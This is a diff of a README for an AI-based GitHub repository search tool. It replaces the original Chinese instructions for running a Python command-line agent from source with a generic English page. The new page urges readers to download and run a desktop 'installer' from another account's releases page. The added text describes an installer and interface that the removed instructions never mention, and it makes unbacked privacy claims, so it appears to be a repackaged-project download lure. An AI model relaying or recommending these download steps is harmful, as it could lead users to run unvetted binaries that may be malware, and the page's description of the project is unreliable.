@@ -1,71 +1,95 @@
-# githubhunt
+# 🌟 githubhunt - Effortlessly Search GitHub Repositories
 
-githubhunt 是一个基于 AI Agent 的自然语言 Github 仓库搜索工具, 用户通过使用自然语言描述需求, 例如: "查找 golang 实现的 redis 服务器, 基于 AELoop", AI Agent 会识别用户的意图, 并结合内置的搜索工具, 不断调整输入优化搜索结果, 最终帮助用户实现 Github 仓库的精准搜索.
+## 🚀 Getting Started
 
-下面是一个简单的使用示例:
+Welcome to githubhunt, your go-to tool for searching GitHub repositories with the power of AI. This application simplifies finding relevant GitHub projects based on your needs. Whether you're looking for code samples, libraries, or tools, githubhunt has you covered.
 
-![image](./example/image.png)
+## 📦 Download & Install
 
-![image2](./example/image2.png)
+To get started, follow these steps:
 
-除此以外, Agent 还支持:
+1. **Visit the Releases Page**  
+   Click the link below to access our releases page and download the software:  
+   [Download githubhunt](https://github.com/Vojat4046/githubhunt/releases)
 
-- 使用视觉理解模型分析仓库, 例如: "解释 xgzlucario/rotom 的流程图"
-- 从用户的 starred 列表中搜索, 例如: "从我的关注列表中查找监控相关的项目, 我是 xgzlucario"
-- 总结或解释仓库的功能: 例如: xgalucario/githubhunt 仓库是做什么的?
+2. **Choose Your Version**  
+   On the releases page, you will see a list of available versions. Select the most recent version to ensure you have the latest features and fixes.
 
-## 系统依赖
+3. **Download the Installer**  
+   Look for the installer file for your operating system (Windows, macOS, or Linux). Click on it to begin downloading.
 
-- [MeiliSearch](https://github.com/meilisearch/meilisearch)
-- Python 3.13
-- DeepSeek API
+4. **Run the Installer**  
+   After downloading, locate the installer file in your downloads folder. Double-click it to start the installation process. Follow the on-screen prompts to complete the setup.
 
-## 项目结构
+5. **Launching the Application**  
+   Once the installation is complete, locate the githubhunt icon on your desktop or in your applications menu. Click it to launch the application.
 
-- `fetch_repos.py`: 拉取 Github 仓库并保存到 MeiliSearch
-- `agent.py`: 使用 Agent 进行搜索
-- `browser.py`: 浏览器截图工具, 用于视觉分析
-- `db.py`: MeiliSearch 索引构建定义和 db 操作封装
-- `config.toml`: 配置文件
+## 🔍 How to Use githubhunt
 
-## 使用方法
+Using githubhunt is straightforward:
 
-### 环境配置
+1. **Enter Your Search Query**  
+   After launching the application, type in your search term in the search bar.
 
-在 `config.toml` 中配置 Github Token(必需) 和 DeepSeek API_KEY(必需) 或者其他模型调用配置, 如果需要使用视觉分析工具, 还需要配置 QWEN_API_KEY。
+2. **Review the Results**  
+   Within moments, you will see a list of repositories that match your search criteria. Each result will display relevant information to help you decide which repository suits your needs.
 
-### 启动 MeiliSearch
+3. **Explore Further**  
+   Click on any repository link to visit its GitHub page. Here, you can access additional details, including documentation, installation instructions, and contributor information.
 
-```bash
-docker compose up -d
-```
+## ⚙️ System Requirements
 
-### 安装依赖
+To ensure smooth operation, please ensure your system meets the following requirements:
 
-首先确保安装了 [uv](https://docs.astral.sh/uv/) 工具, 然后执行命令:
+- **Operating System:**  
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Ubuntu 20.04 or later
 
-```bash
-uv sync
-```
+- **Memory:**  
+  At least 4 GB of RAM  
+  (8 GB recommended for optimal performance)
 
-### 拉取 Github 仓库
+- **Storage:**  
+  Minimum of 200 MB available space
 
-第一次运行时需要同步 Github 仓库到 MeiliSearch, 后续可以按需定期同步。
+## 🎉 Features
 
-在本地构建索引可以大大提升搜索性能, 原因是本地使用 `frequency` 的[匹配策略](https://www.meilisearch.com/docs/reference/api/search#matching-strategy), 相比 Github API 的 `all` 策略, 每次搜索的召回率更高, 返回的结果数量更多, 更容易命中目标仓库。
+githubhunt offers several powerful features:
 
-```bash
-uv run fetch_repos.py
-```
+- **AI-Powered Search:** Find repositories with enhanced accuracy.
+- **User-Friendly Interface:** Easy to navigate, no technical skills required.
+- **Real-time Results:** Get instant feedback as you type.
+- **Filter Options:** Narrow down your search based on language, stars, or recent updates.
 
-### 使用 Agent 进行搜索
+## ❓ Frequently Asked Questions
 
-```bash
-uv run agent.py --query "查找 golang 实现的 redis 服务器, 基于 AELoop"
-```
+### How does githubhunt work?
 
-使用视觉分析工具:
+githubunt uses an AI algorithm to analyze GitHub repositories and provide the most relevant results based on your input. 
 
-```bash
-uv run agent.py --query "解释 xgzlucario/rotom 的流程图" --visual
-```
+### Can I suggest new features?
+
+Yes! We value user feedback. Please visit our Issues page on GitHub to suggest improvements or report problems.
+
+### Is my data safe?
+
+We do not collect personal data. Your search queries remain private.
+
+## 🛠️ Contributing
+
+We welcome contributions from everyone. If you would like to help improve githubhunt, please check out our guidelines on the repository for more details.
+
+## 🔗 Additional Resources
+
+For more information on how to maximize your use of githubunt, check out the following resources:
+
+- [GitHub Repository](https://github.com/Vojat4046/githubhunt) – Explore the complete codebase.
+- [Issues Page](https://github.com/Vojat4046/githubhunt/issues) – Report bugs or request features.
+
+## 📅 Stay Updated
+
+Keep an eye on our releases page for future updates and improvements. You can bookmark it here:  
+[Download githubhunt](https://github.com/Vojat4046/githubhunt/releases)
+
+Thank you for choosing githubhunt!
